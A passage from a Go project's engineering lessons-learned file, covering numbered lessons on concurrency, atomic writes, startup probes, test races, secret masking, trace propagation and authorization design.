    distinction. Before assuming a generated query builder's `Get`/`Only`/`First` gives an interceptor a
    different result shape than `All` does, read the actual generated code (`*_query.go`'s builder methods,
    not just the client-facing docs) rather than assuming from the method names alone.

46. **A maintenance/rotation write that bypasses a resource's normal optimistic-concurrency write path must
    still honor that same compare-and-swap, or it becomes an unconditional last-writer-wins that silently
    discards concurrent legitimate changes.** `RotateDeviceProperties`'s original `UpdateOneID(...).
    Save(ctx)` had no conditional on the row's `version` column, unlike the domain's own
    `entRepository.Save`; a legitimate concurrent write landing between its read and write was silently
    overwritten, and the stored version counter was left describing content that was no longer what got
    persisted. A background/maintenance operation touching the same storage a domain write path also
    touches needs the identical CAS discipline that domain path already earned through its own tests, even
    when the maintenance operation's own semantic content (re-wrapping ciphertext) makes it tempting to
    treat as "not really" a concurrent-write hazard.

47. **`O_CREATE|O_EXCL` alone does not make a file's *content* atomic, only its *existence*.** A file
    becoming visible to a concurrent reader and a file being fully written are two different moments; an
    exclusive create closes the "who gets to be the writer" race but leaves the file observably empty (or
    partially written) between the create and the write completing. The correct pattern for content that
    must never be observed partially written is: write the full content to a temp file in the same
    directory, close it, then commit it into its final name atomically (`os.Link`, which fails on an
    existing destination so a loser can detect and defer, not `os.Rename`, which silently replaces one).
    This was caught by a test written specifically to probe the race
    (`TestResolveKey_ConcurrentGenerationConverges`, 16 concurrent goroutines under `-race`), not by
    inspection: the bug was invisible reading the O_EXCL version's code in isolation, since exclusivity
    genuinely does prevent two callers from both "winning" the create -- it just doesn't prevent one from
    reading the other's in-progress state before the write finishes.

48. **A composition root gaining new one-time startup work (a migration, a rotation pass, a cache warm) must
    run it concurrently with, never strictly before, whatever makes the process's health probes pass.** A
    synchronous call added directly in `main()` before `ListenAndServe` seems like the obviously-correct,
    simple place to put "do this once at startup" work, but it silently couples that work's completion time
    to the process's liveness, which a container orchestrator is independently watching on its own clock. A
    Kubernetes liveness probe does not know or care that a controller is "doing important setup work"; it
    only knows nothing has answered its `httpGet` yet, and will kill and restart the container into the
    exact same blocking work, indefinitely. One-time startup work with an unbounded or fleet-scaled runtime
    belongs in its own goroutine started once the server is already listening, not inline before it.

49. **A function walking every prefix of a caller-controlled sequence must build its accumulated key
    incrementally, never rejoin the whole prefix from scratch on each step, once that sequence can be
    externally supplied.** `internal/classification.Classify`'s first draft rebuilt its dotted lookup key
    via `strings.Join(path[:i], ".")` inside a loop over every prefix of `path`, an obviously-correct,
    simple way to write the loop that is O(n^2) in `len(path)`. That cost was invisible against the
    hand-written 3-4 level paths every existing test and the default rule set actually used, and it stayed
    invisible in review until an adversarial pass benchmarked the real function directly against a long
    input rather than reasoning about the loop shape in the abstract. Once a sequence's length is
    attacker- or user-controlled (a YAML list a person can hand-edit, a CLI flag split on commas), an
    O(n^2) prefix-rebuild is a real, cheap resource-exhaustion vector, not a theoretical one: a few hundred
    KB of input reproduced a multi-second-to-minutes hang. The fix is mechanical once spotted (a
    `strings.Builder` appended to once per step, since its `String()` method returns accumulated bytes
    without copying) but the lesson is in when to reach for it: any loop that reconstructs a growing prefix
    of caller-supplied data on every iteration is a candidate, and a bound on the caller-supplied length
    (this package's new `maxPathSegments`) is a cheap, independent second line of defense that survives
    even if a future change to the algorithm reintroduces worse-than-linear cost.

50. **An adversarial review's suggested code fix must itself be checked against the invariant it's meant to
    protect before applying it, especially when the review is really pointing at a doc/code mismatch rather
    than a functional bug.** The same review that found Lesson 49 also flagged `pkg/policy.IntersectSlices`'s
    own doc comment ("a nil or empty acc means no constraint yet") as inconsistent with the code, which only
    special-cased `nil`. The tempting fix (special-case `len(acc) == 0` instead of `acc == nil`) would have
    been wrong: `IntersectSlices` is called repeatedly inside a fold, once per layer, with each call's
    result becoming the next call's `acc`, so a genuinely-narrowed-to-empty result midway through the fold
    must stay sticky, or a later, disjoint layer can revive a value an earlier layer already excluded,
    which is exactly the non-monotonic-widening bug this function exists to prevent. Tracing the fold
    sequence by hand (and then writing
    `TestIntersectSlices_EmptyResultStaysStickyAcrossFold` to pin it) showed the code's `nil`-only check
    was the correct behavior and the doc comment's broader "nil or empty" claim was the actual defect.
    Treat "the code and its own doc comment disagree" as two candidate fixes, not one: fix whichever side
    is actually wrong, verified against the real invariant, not whichever side is easier to edit.

51. **A nested command dispatcher needs a shared sentinel error to keep its own "unknown subcommand"
    failure the same shape as the outer dispatcher's, because a plain `error` return type erases that
    distinction on the way up.** `cmd/pleiades/main.go`'s top-level `run()` special-cases an unrecognized
    command name before ever calling a handler, so it can return its own exit code (2) directly. Once a
    handler is itself a nested dispatcher (`forge.go`'s `runForge`), its "no match" case can only report
    back through the same `error` a handler's own business failure uses, and without a shared signal the
    two become indistinguishable to the caller: both surface as an ordinary handler error (exit 1),
    silently losing the "this name doesn't exist" distinction the top level treats as a different, more
    specific failure. The fix is one unexported sentinel (`errUnknownCommand`) returned by both the
    top-level and every nested "no match" branch, checked with `errors.Is` at the one place that decides
    exit codes. This is a one-time, generic addition made by the phase that introduces the first nested
    dispatcher, not a special case bolted on for that one dispatcher: any future nested dispatcher reuses
    the same sentinel for free. Any dispatch layer added over a plain-`error`-returning handler contract
    should ask this question before assuming a status code will simply propagate: does anything about
    *how* this failed matter to a caller above me, and if so, does my return type still carry that
    information, or did I just flatten it back into "an error happened"?

52. **A roadmap phase's own checklist prose can go stale relative to a shared primitive an
    earlier-numbered phase already built, when phases execute out of their originally-drafted order --
    verify the primitive's real existence in code before trusting what a phase's own Pattern Entry Gate
    says about it.** Phase 31's checklist (`.SPECIFICATION/IMPLEMENTATION.md`) asserted "`pkg/registry`
    does not exist" and instructed building it there, first, as a two-type-parameter
    `Registry[K comparable, V any]`. Phase 6 had already built it, as `Registry[T any]` (one type
    parameter, string-keyed), with two real consumers already wired to it by the time Phase 31 was
    picked up. `PLAN.md` Section 25's own build-once table had already hit and corrected this identical
    class of drift twice, both times for the same primitive (reassigning its builder from Phase 21 to
    Phase 6) -- this was a third instance of the same failure mode, just against a different phase's
    checklist text, never corrected because that phase hadn't been implemented yet. Treating the stale
    premise as current would not have been a harmless redundancy: building the two-type-parameter
    version as literally specified would have been Section 25's own named defect ("a second
    implementation is a defect, not a variation"), shipped in service of a checklist item that was wrong
    about the codebase's starting state. A phase number is a position in a drafting order, not a
    guarantee about what has or hasn't been built by the time someone actually starts it; a checklist's
    own "X does not exist yet" claim is a claim about the repo at drafting time, and needs the same
    direct verification (`grep`, `gopls references`, reading the actual package) as any other assumed
    fact before code is written to satisfy it.

53. **A checklist item can name the right shared primitive and still cite the wrong mode of it, when
    the item's own prose conflates two distinct call sites that merely sit near each other in the
    specification -- cross-check a cited test/example against what it actually proves, not just
    against whether the primitive it names is the correct one.** Phase 32's "capability granularity:
    decided" item said the classification-driven capability field (a device's capabilities
    accumulating down the classification tree, e.g. `debian_family` adding `AptCapable` on top of
    `linux_server`'s baseline) needed `pkg/policy`'s *intersection*-mode call site, citing
    `pkg/policy/policy_test.go`'s `TestIntersectSlices_ViaResolve` (a "manifest narrowed by runbook"
    example) as already-built evidence. Both `pkg/policy.go`'s own doc comment and
    `internal/classification/rule.go`'s own doc comment, written before this phase touched either
    file, already said the opposite for this exact field: "a future Capabilities field, Phase 32
    scope, would be Union." The cited test was not wrong, and the primitive named (`pkg/policy`) was
    the right one -- but the test proves a *different* Phase-32-adjacent resolution (a Collection
    manifest's required capability narrowed by a runbook/task-level requirement, which needs a
    runbook-level narrowing field that does not exist anywhere yet) than the one the checklist item's
    prose was actually describing (capabilities accumulating down a classification tree, which is
    strictly additive and must never narrow what a broader level already granted). Implementing the
    checklist's literal claim (Intersection) would have silently broken the worked example the same
    item's own prose gives two paragraphs earlier: a level's Capabilities would clamp to the
    intersection of every layer instead of accumulating, so `debian_family`'s `AptCapable` would only
    survive if `linux_server`'s own rule also happened to list it. The general lesson: when a
    checklist item cites a specific test or example as evidence a mechanism already exists and is
    ready to reuse, read what that test actually asserts, not just whether it exercises the primitive
    named -- two real, correctly-built call sites of the same shared primitive can require opposite
    merge semantics, and a checklist written before either was implemented can attribute one's
    evidence to the other.

54. **A shared helper's implicit precondition survives unnoticed until a caller finally violates it --
    audit what a function silently assumes about every past caller, not just what its signature says,
    before adding a new caller that differs from all of them in one respect.** `splitPositional`'s doc
    comment named its true premise honestly ("every flag ... takes a value"), but nothing enforced it:
    the function had three call sites (`add-host`, `add-credential`, later `forge new-device`/`forge
    new-collection`), and the premise happened to hold for the first, by coincidence, and silently did
    not for `add-credential`'s pre-existing `--passphrase` bool flag, because no existing test ever put
    another flag immediately after it. `forge new-collection`'s own new `--requires-elevation` bool
    flag was the first caller exercised with a flag following it, which is what surfaced both the new
    bug and the pre-existing, unnoticed one in the same fix (FAILURE_PATTERNS.md #50). The general
    lesson: when reusing an existing shared function for a new caller, check its stated assumptions
    against the new caller's actual shape, not just against whether the new caller's *inputs* look
    superficially similar to prior callers' -- a precondition that has never been violated is not the
    same as a precondition that has been verified.

55. **A source filename ending in `_GOOS.go` or `_GOARCH.go` is an implicit build constraint in Go, with
    no `//go:build` line required, and `go build ./pkg` succeeding proves nothing about whether every
    file in it was actually compiled.** `capabilities_windows.go` silently matched the reserved GOOS value
    `windows` and was excluded from every build and test on this project's real (`linux/amd64`)
    platform since the day it was written; the package still built and its own tests still passed,
    because Go doesn't need the excluded file to make the rest of the package valid
    (FAILURE_PATTERNS.md #51). Two verification habits would have caught this immediately and neither was
    in routine use: `go list -f '{{.GoFiles}}' ./pkg/...` (or `.IgnoredGoFiles}}'` to see exactly what got
    left out) after adding a new file to an existing package, and picking a filename topic suffix by
    checking it against Go's own reserved GOOS/GOARCH list first, not just against this project's own
    naming convention for sibling files (`capabilities_cloud.go`, `capabilities_exec.go`, etc., none of
    which happen to collide, entirely by luck). "The package built" and "the file I just added is part of
    the package" are not the same claim; only `go list`'s own file inventory proves the second one.

56. **A generated, per-package `init()`-registration pattern needs its own composition-root aggregator
    from day one, proven by an integration-level test, not by each generated package's own isolated
    unit test.** Every one of Phase 34's 71 generated Collection packages' own test passed
    (`collection.Lookup` finds itself, inside its own test binary, which imports itself by definition) while
    the shared `pkg/collection` registry stayed completely empty in the one binary that actually mattered,
    because nothing else in the codebase had any other reason to import any of them
    (FAILURE_PATTERNS.md #52, structurally the same shape as #27's dormant SQLite driver). The general
    rule this project already half-knows from `internal/inventory/builtins.go`'s device-type pattern:
    any "many packages self-register via `init()`" design needs exactly one more thing, a blank-import
    aggregator that something in the real binary actually imports, built and wired in the same change
    that introduces the first generated package, not discovered later by a test that happens to check
    the aggregate rather than each part in isolation. When the aggregator can be derived mechanically
    from the same data driving generation (as it can here), generate it too, rather than hand-maintaining
    an import list that drifts the moment someone edits the data table and forgets the aggregator exists.

57. **`go test ./...`'s default cross-package concurrency means a test that mutates the real module tree
    can race a different package's `go list`-based architecture test, and the fix is not always worth
    building.** Three independent packages' end-to-end tests (two pre-existing, one added this phase)
    each write and then remove a real temporary package directory under `internal/` to prove a CLI
    surface against the actual module (RULE 0); `internal/archtest`'s tests shell out to `go list
    .../internal/...` over that same live tree. Neither category of test is wrong on its own, and neither
    can see the other's existence, but running many packages' test binaries concurrently (Go's own
    default) can transiently interleave a directory create/delete with a `go list` walk of the same
    path (FAILURE_PATTERNS.md #53). Not every real, reproducible-in-principle race is worth fixing with
    new infrastructure: cross-process synchronization between otherwise-unrelated test packages is real
    engineering cost for a failure mode a repeat run already resolves, and this project already has an
    established, accepted remedy for exactly this shape of flake ("run `make ci` twice"). Recognize when
    a finding belongs in the record as a known, accepted risk rather than as a blocking defect to
    engineer around.

58. **A fixture that sets a field the code under test never reads is not evidence a feature works; it is
    evidence the test doesn't fail.** `TestGrandIntegration` tagged devices with a `group` property and
    dispatched to that group name, and had passed on every run since it was written, not because
    group-scoped dispatch worked, but because the dispatch path it exercised never looked at that property
    at all (FAILURE_PATTERNS.md #54). A green test only proves a feature works if its assertion is
    actually coupled to the code path under test; a fixture value that happens to match the code path's
    real read set by coincidence, rather than because the code path consumes it, keeps passing right up
    until a real implementation lands and the coincidence stops holding. When a checklist item says a
    piece of state is "currently discarded" or "not yet wired up" (Phase 7's own checklist said exactly
    this about `GetGroup`'s `groupName`), grep for every existing test that already passes a
    non-empty/non-default value into that argument before implementing the fix: a pre-existing, currently
    "passing" test is the first place a masked defect exposes itself once the real implementation starts
    reading what it used to ignore.

59. **Namespacing a shared directory on the way in is only half the job; the cleanup has to be namespaced
    too.** Two end-to-end tests in different packages each generated into
    `internal/catalog/test/<name><pid>` and each removed `internal/catalog/test` afterwards, so under
    `go test ./...`'s cross-package concurrency one deleted the other's package mid-build
    (FAILURE_PATTERNS.md #55). Every author had correctly reasoned about collisions when choosing where to
    write and then reached for the parent when tearing down, because the parent is what looks like "the
    directory this test made". A `t.Cleanup` that removes anything above the exact path the test created
    is a cross-package race in waiting, and it will present as a failure in whichever unrelated package
    loses the timing, which is the hardest possible place to look for it.

60. **A port is not complete because every method on it works; it is complete when every operation its
    consumers need exists.** `inventory.Repository` had get, list, and save, all correct, and no way to
    create a device, because the one caller that created devices bypassed the port and wrote YAML directly
    (FAILURE_PATTERNS.md #56). The gap was invisible for as long as no consumer needed it and became a hard
    blocker the moment a sync plugin did. When adding the first real consumer of an existing port, list the
    operations that consumer needs *before* implementing it and check each one against the port, rather
    than discovering the hole partway through: the missing operation is rarely a method that is broken, it
    is a method nobody has needed yet, so nothing about the existing code looks wrong.

61. **A default value that names the wrong kind of thing stays harmless exactly until something compares
    against it.** A file-backed repository stamped `Source.Plugin = "file"` on every host with no recorded
    provenance, conflating "where this is stored" with "which sync plugin authoritatively owns this"
    (FAILURE_PATTERNS.md #57). Nothing read that field for as long as no plugin existed, so the wrong
    default cost nothing and looked reasonable in review. The first real sync plugin then read it exactly as
    designed and refused to adopt a single host. Prefer leaving a field zero over filling it with a
    plausible-looking value from an adjacent concept: an empty value is honestly "unknown" and can be
    adopted later, while a wrong non-empty value is indistinguishable from a real one and will be believed.

62. **"Refuse loudly" and "tell me what would happen" are different requests, and one guard can serve both
    only if the caller decides which it wanted.** A read-only Repository wrapper that returned a typed error
    on every write was correct, and it turned `sync --read-only` into an abort on the first device rather
    than the dry run the flag promised (FAILURE_PATTERNS.md #58). The fix was not to soften the guard, which
    would have made it useless where a hard refusal is right, but to let the reconciler catch that specific
    error and report `would add` instead of failing. The general shape: keep the enforcement strict and
    total at the boundary, and put the interpretation one layer up, where the caller knows whether it is
    enforcing or simulating. A guard that tries to be lenient in some contexts has to know its callers,
    which is exactly what a boundary exists to avoid.

63. **A second consumer is what turns an interface from a guess into a design, and the two consumers have
    to be unalike for the evidence to count.** `PLAN.md` Section 6a's four-method sync plugin port was
    deliberately not built for the static YAML plugin alone, on the recorded grounds that one static-file
    implementation is not enough to design a port around. Building it against a live Cisco Catalyst Center
    at the same time produced an interface neither implementation would have produced by itself: the
    file-backed one has no authentication, no paging, and a classification the document states outright,
    while the network-backed one has all three and derives its classification from raw upstream fields.
    The conformance suite running both through identical assertions is the artifact that makes the claim
    checkable rather than asserted. When deferring an abstraction for want of a second consumer, say so in
    the code (that comment is what made this decision easy to revisit correctly), and when the second
    consumer arrives, pick the one that is least like the first.

64. **A shared fold-and-merge primitive's safety comes from the caller's combine function, not from the
    primitive; a "more specific wins" mode and a "the strongest statement wins" mode look identical until
    the case where they disagree.** `pkg/policy.Resolve` folds System -> Organization -> Group -> Device
    RoleBindings for RBAC scope resolution (Phase 8, closing the last of Section 25's eight named call
    sites). Plain `policy.Override` already satisfies PLAN.md 18.4's literal worked example for free
    (a Device-level Deny beats a Group-level Allow, since Device folds last) - but it would also let a
    later, more specific Allow override an earlier, broader Deny, which a security primitive should not do
    silently. The two modes are indistinguishable by their passing tests until a test is written for the
    specific case where a broader Deny meets a narrower Allow, which is exactly the case a naive
    "device-level RBAC is overridable" reading of the spec would miss. State which of the two a combine
    function implements in a comment at the combine function itself, not only in the call site's own doc
    comment, and write the disagreeing-case test before trusting either.

65. **A schema-diff codegen tool's own safe-by-default option can make a schema removal silently
    incomplete, and the tool exiting zero looks identical to "nothing needed doing."** `internal/ent/migrate
    /gen/main.go` diffs the desired ent schema against the last-applied migration state and writes the
    incremental SQL. Its `Schema.WriteTo` call passed no `MigrateOption`s, so ent's own `WithDropColumn`
    default (`false`, a real and correct safety choice in ent itself) meant removing a field from a schema
    file produced a migration that added everything new and silently omitted the `DROP COLUMN` for what was
    removed (FAILURE_PATTERNS.md #59). Nothing in the tool's own output distinguished "correctly found no
    change here" from "deliberately declined to emit a destructive statement." When a schema change is a
    removal, not just an addition, read the generated migration file directly rather than trusting a clean
    exit code, and check the tool's own option defaults for anything opt-in specifically because it is
    destructive.

66. **A `make ci`/coverage regression that predates a session's own diff is still worth finding, but is not
    that session's to fix.** Four packages Phase 8 never touched (`internal/forge/genutil`,
    `internal/inventory/record`, `pkg/collection`, `tools/gencatalog`) were already below their recorded
    `coverage-floor.json` floors before this session started, confirmed by measuring the identical
    percentages in a disposable `git worktree add --detach` checkout of the base commit
    (FAILURE_PATTERNS.md #60). The cheap, reliable way to answer "did I cause this" is that worktree
    comparison, not memory of what the diff touched or an assumption that a red check must be the current
    session's fault. Recording the finding plainly, without silently lowering the floor (which would hide a
    real regression from whoever's change actually caused it) or silently fixing four unrelated packages'
    tests (scope creep well outside whatever the current task actually is), is the same discipline this
    project already applies to flaky container tests: a known, pre-existing gap stated honestly is not the
    same failure as a gap this session's own verification papered over.

67. **Adding a cache to a function silently invalidates any benchmark that assumed every call does real
    work, and nothing fails to flag it.** `dag_bench_test.go`'s `BenchmarkDAGBuilder` called
    `builder.Build(payload)` with the *same* condition text on every one of its `b.N` iterations, and its
    own doc comment stated the point was to measure "real CEL condition compilation." Phase 9 added a
    Flyweight compile cache to `celEvaluator.Compile` (`internal/engine/cel.go`) for an unrelated reason
    (closing the "cache compiled programs" checklist item) - and the moment it existed, iterations 2..N of
    that benchmark silently became cache hits. Nothing broke: the benchmark still ran, still reported a
    number, still looked like the same measurement it always had. Only reading the benchmark's own doc
    comment against what the new code actually does revealed the number had quietly stopped meaning what it
    claimed. Caught during this phase's own verification pass, not by any test failing. When adding a cache
    (or any other layer that makes repeated identical calls cheaper than the first), grep the codebase for
    existing benchmarks that call the now-cached function with fixed/repeated input, and either vary the
    input per iteration to keep measuring the cold path, or rewrite the benchmark's own doc comment to
    honestly describe the amortized/cached path it now measures - do not leave the old claim standing next
    to new behavior that quietly stopped supporting it.

68. **A "closed by construction" discriminator needs an explicit exemption list the moment one case
    legitimately crosses it, and the doc comment claiming closure must be edited in the same change.**
    `internal/validate/collection_rule.go`'s `CollectionRule` used to route purely on
    `strings.Contains(fqcn, ".")`: dotted meant "look it up in `pkg/collection`," undotted meant "engine
    keyword or legacy builtin, skip it," and the doc comment stated this would always hold because
    `pkg/collection.Register` itself refuses an undotted name. Giving `set_metadata` a second, dotted
    spelling (`pleiades.builtin.set_metadata`, `internal/engine/action.go`'s hardcoded switch, deliberately
    kept out of `pkg/collection` since no dispatcher in this codebase calls a registered method's real
    implementation yet) broke that closure: the dot check alone would now misfile a real, working builtin
    as an unregistered collection name. The fix is a small, named `dottedBuiltinExemptions` set checked
    before the dot test, not a change to the dot test itself - and the old doc comment's "will remain a
    bare, undotted word" claim had to be corrected in the same commit, since leaving it standing would have
    left the comment actively contradicting the code three lines below it the moment someone read both.

69. **`tools/gencatalog`'s `go generate` target is not incrementally safe: it re-runs `forge new-collection`
    for every catalog entry, and the real CLI refuses to overwrite a file that already exists.** Renaming
    one `internal/forge/catalogdata` entry (`wait.port` -> `pleiades.builtin.wait.port`) and then running
    `go generate ./internal/forge/catalogdata` failed immediately on an unrelated, already-generated entry
    (`exec.command`) before ever reaching the renamed one, because the tool loops over all ~70 entries and
    calls the real `pleiades forge new-collection` binary once per entry with no "skip if unchanged" check.
    Making this work would require deleting the entire generated `internal/catalog/` tree first, a large,
    unnecessary blast radius for a one-entry rename. The targeted fix: call the real CLI directly for just
    the new entry (`pleiades forge new-collection pleiades.builtin.wait.port --capabilities ... --transports
    ... --engine-version ...`, mirroring `newCollectionArgs`'s own argument-building exactly), which writes
    only the two new files since nothing already occupies that path; delete the old entry's now-orphaned
    generated files by hand (`gencatalog` never calls `os.Remove` on stale output); and separately
    regenerate `internal/catalog/builtins.go` (the one step in `gencatalog` that does not go through the
    CLI at all - it recomputes the aggregator's import list directly from `catalogdata.Collections` and
    always overwrites). A full wholesale `go generate` run is for a from-scratch catalog build, not a
    single-entry rename.

70. **"Masked at the moment of registration" is a property of *when* a task marks its own output secret,
    not of *what shape* the marked field name can take - the two are independent axes and only one of
    them needed to change.** A request to mask a value "at instantiation, like a password" sounded at
    first like it might require a new mechanism distinct from `Task.SecretFields` (`secret_fields:`,
    since renamed `RegisterMask`/`register_mask:`), which already runs `markRegisterMask` before
    `Register`/`Merge` and before this same task's own `publish` call (`executor.go`) - the exact "no
    exposure window" timing already asked for. The only real gap was that `SecretFields`/`SecretMaskSpec`
    both matched flat, top-level `Stats` keys only, and the requested syntax wanted dotted, nested paths
    (`parent.nested_secret`). Solving that meant extending the existing same-task mechanism with a path
    walker (`resolveRegisterMaskPath`), not building a third one: `secret_mask.go`'s own doc comment had
    already named "a nested-path syntax" as "a clean additive follow-up if a real need for one appears" -
    this was that need appearing, for one of the two mechanisms, not both. Deliberately not extending
    `SecretMaskSpec` (the retroactive, different-task case) to the same nested-path support keeps the two
    mechanisms' scope honest rather than unifying them because the syntax looked similar on the surface.

71. **A masking feature that silently fails to mask is worse than one that never shipped, and a real
    hand-written usage example is what caught it, not the tests written for the feature.** `register_mask`
    landed with paths resolved literally against `ActionResult.Stats` (a flat map with no key named after
    the task's own register), matching the deliberately-dropped-prefix design this session had picked. A
    genuine usage example added afterward wrote `register_mask: running_config.stdout` on a task registered
    as `running_config` - the natural spelling, mirroring `when_cel`'s own `stat.<register>` addressing
    used two tasks later in the same file - and it silently resolved to nothing: `Stats["running_config"]`
    does not exist, so the path was a benign "not found" skip, and the secret it was meant to protect
    would have leaked in cleartext with the runbook reporting no error at all. Every test written *for* the
    feature passed, because every one of them was written against the same bare-path assumption the bug
    shared. The fix, `markRegisterMask` stripping an exact `<Task.Register>.` prefix before resolving, so
    both spellings reach the same field. **The lesson is procedural, not just the specific bug:** a
    security- or secrecy-relevant feature's own test suite, written by the same reasoning that designed the
    feature, cannot catch a design assumption that reasoning got wrong - it takes an independent, real
    usage example (here, one the user wrote by hand for a different purpose entirely) to surface that class
    of gap. A silent no-op is the worst failure mode this specific feature can have, worse than a hard
    error, so a real dogfood usage pass belongs in the checklist before calling a masking feature done, not
    only a green test suite the feature's own author wrote.

72. **A roadmap checklist item's "Expected" pattern list is a draft prediction to verify, not a mandate to
    satisfy, and a Pattern Entry Gate's own Adversarial Pattern Justification line can reveal that the
    "light" version of an item is an active regression, not merely an inert one.** Phase 10 (Workflow DAG
    Builder)'s Pattern Entry Gate listed Checkpointing as "Expected," but `PLAN.md` Section 25's own table
    already described that pattern as a durable run record "separate from the compiled definition" -
    exactly what Phase 10 (`engine.Builder`/`engine.DAG`) is, and Phase 27 already independently claimed
    the same pattern in its own Pattern Entry Gate for the shape that actually needs it (a persisted row
    surviving a multi-day approval pause). Building it here anyway would have violated Section 25's "one
    implementation per contract" rule for no real gain. Separately, "add typed edges so status routing can
    be expressed" read, on first pass, like a small, additive, structural-only change - add an enum, done.
    Pressure-testing it against the real code (before any implementation) found the opposite: `Executor.Run`
    aborts its whole walk on any node failure, and `LevelIterator`'s reachability is computed once, up
    front, independent of runtime outcome. Naively wiring `Task.Rescue` into a real `Adjacency` edge without
    also rewriting that control flow would not have been an inert, unconsumed piece of vocabulary - it
    would have made `Rescue` fire on the *happy* path (its in-degree already hits zero when the guarded
    block's own exit level is returned) and never fire on the *failure* path it exists for (since `Run`
    aborts before that level is ever requested). The lesson generalizes past this one phase: when a
    roadmap's own checklist line describes an "Expected" pattern or a "just wire it in" step, treat both as
    claims to verify against the real, current code before writing anything, not facts to implement against
    - and when a hostile pressure-test surfaces that the small version of a change is actively wrong rather
    than merely incomplete, that is exactly the finding a Pattern Entry Gate exists to catch before code is
    written, not after.

73. **A cross-process concern is only "built" once it is proven at the far end; the boundary crossing is
    the feature, not the header.** Phase 11's checklist said "inject trace context into event headers on
    publish." Doing exactly that is easy, testable, and worthless on its own: a `traceparent` no consumer
    reads is a decoration with a passing test attached, the same failure shape Phase 10's own Adversarial
    Pattern Justification line warns about for a port with no callers. What made it real was extracting at
    the one place that actually consumes raw messages (`runner.Agent.handleMessage`, which pulls
    `jetstream.Msg` values on its own loop by design) and asserting, with a recorded span, that the
    Runner's span sits in the *same trace* and is parented to the *same span* the API request created.
    Note what that assertion is not: it is not "a header was written," which is what a publish-side-only
    test proves. The general rule is that any requirement phrased as "X survives boundary B" needs a test
    that observes X on the far side of B through the real consumer, and if no real consumer exists yet,
    that absence is the finding to report rather than a reason to test the near side twice.
    (`internal/event/trace.go`, `internal/runner/agent_trace_test.go`.)

74. **Prefer one wire format decided in one place over per-boundary "reasonable defaults," and encode the
    format the specification mandates rather than the one the language makes convenient.** Trace context
    now crosses two boundaries in this codebase (HTTP headers at the API edge, NATS headers at the bus).
    Both take their propagator from `telemetry.Propagator`, a single free function, precisely because a
    second "obvious" choice at the second boundary is how a trace stops crossing it: two W3C-compliant
    processes that disagree on composition silently produce two disconnected traces and no error anywhere.
    The convenience trap was concrete here. `nats.Header` and `http.Header` share an underlying type, so
    `propagation.HeaderCarrier(http.Header(hdr))` compiles, runs, and round-trips perfectly between two Go
    processes - while writing the canonicalized `Traceparent`, because `http.Header`'s methods
    canonicalize and NATS does not. The W3C specification mandates lowercase, so that shortcut would have
    been invisible to a consumer in any other language, and invisible to us too, since every test we would
    naturally write has Go on both ends. Writing an explicit twenty-line carrier that emits the exact
    mandated spelling and reads case-insensitively is the cheap price of not discovering this from a
    Python consumer two years later. (`internal/event/trace.go`'s `natsHeaderCarrier`.)

75. **Changing where the default logger writes is a behavior change with a blast radius well past
    logging, and both directions of it bite.** Installing a JSON `slog` handler on `os.Stdout` and calling
    `slog.SetDefault` in `cmd/controller` looked like pure improvement. It silently did two other things.
    The standard `log` package routes through `slog.Default` at *info* level, so every `log.Fatalf`
    startup failure in that binary began emitting as an `INFO` line: no alert keyed on level would ever
    have fired for a controller that failed to start, and the only reason this was caught is that a manual
    run happened to fail and the JSON said `"level":"INFO"` next to a fatal message. And a release-gate
    test that scraped the subprocess's *stderr* for a log line (correct, when `slog`'s built-in default
    wrote there) began seeing nothing at all, failing with a timeout that described a leader-election
    problem rather than a logging one. Both are the same underlying rule: log destination and log level
    are part of a binary's observable contract, and anything that asserts on them - an alert, a test, a
    scrape config - is coupled to a decision that looks internal. When changing it, grep for what reads
    the old destination before assuming the change is additive.

76. **A mechanism with a passing unit test suite and zero production callers is not "adopted," and
    `PATTERNS.md` saying `YES` does not make it so.** `auth.AdmissionChain`/`auth.Admission` were built,
    tested, and documented in `PATTERNS.md` as this platform's zero-trust enforcement a full phase before
    anything outside `internal/auth`'s own tests ever called `Evaluate`. The gap survived because every
    signal that would normally catch it was pointed at the wrong layer: `go build`/`go vet` confirm the
    type compiles, a green test suite confirms the logic is correct in isolation, and a Pattern Entry Gate
    that names a mechanism reads as though naming it closes the question of whether it runs. None of the
    three asks "what production code path actually reaches this." The check that does is mechanical and
    cheap - grep every exported entry point of the mechanism for a caller outside its own package's
    `_test.go` files - and it has to be run explicitly, on purpose, because nothing else in the normal
    build/test/lint sequence will surface a real capability that nothing calls. Apply this any time a
    phase's own checklist says a port, a chain, or a validator was "implemented": implemented and wired
    are different claims, and only the second one is a security or correctness guarantee. The same
    session found the same shape a second time one layer down: a forged-token corpus that had genuinely
    been run once, correctly, left no test file behind, so "was verified" and "was asserted in a
    checklist" were indistinguishable until someone re-ran it (`FAILURE_PATTERNS.md` #65, #68).

77. **Wrapping `http.ResponseWriter` is lossy by construction, and the loss is invisible to every test
    that does not exercise the specific optional interface it dropped.** An embedded `http.ResponseWriter`
    promotes exactly three methods, so `http.Flusher`, `http.Hijacker`, `io.ReaderFrom`, and `http.Pusher`
    all vanish through any decorator that wraps one. Phase 13's deleted HATEOAS middleware had passing
    unit, benchmark, and fuzz tests and would still have turned the SSE log endpoint into a 500 the first
    time it was mounted, because that handler type-asserts `http.Flusher` and the wrapper does not satisfy
    it (`FAILURE_PATTERNS.md` #70). Before adding a middleware that wraps the writer, ask what else on the
    same router asserts something about its own writer; when the answer includes a streaming handler, the
    right shape is a seam the handler calls rather than a decorator that intercepts it. Forwarding the one
    interface you noticed is not a fix, because the next optional interface is still dropped and the next
    handler to need one will fail the same way.

78. **Compute an affordance and enforce it from the same object, or the two will drift.** Any system that
    tells a client what it may do, and separately decides whether to allow it, has two implementations of
    one question. Phase 13 makes them one by construction: the composition root builds a single
    `auth.AdmissionChain` value, hands it to `api.RequireScope` (which enforces) and to
    `auth.NewAdmissionHATEOASGenerator` (which advertises), and a link and a 403 cannot disagree because
    they are the same evaluation over the same rule list. This generalizes past hypermedia to any
    "preview" or "capabilities" endpoint: the preview must call the decider, never re-derive its logic,
    and the test that matters asserts equivalence across every identity rather than checking each side
    separately.

79. **A speculative authorization probe is not an access decision and must not be recorded as one.**
    Computing which actions to offer means asking the admission chain about every candidate, most of which
    a given caller lacks. Routing that through the audited path would emit one audit line per candidate
    per request and log every unheld permission as a denial at `Warn`, burying the denials that represent
    somebody actually attempting something under speculative ones nobody attempted. Nobody asked to delete
    a device by loading a page. The mechanical form of this rule: if a component both enforces and
    answers "what could I do", the enforcing path takes the recording wrapper and the advertising path
    takes the bare decider, and a test asserts the request records exactly one decision.

80. **Never reflect a caller-controlled path back as a URL the client is invited to act on.** Build every
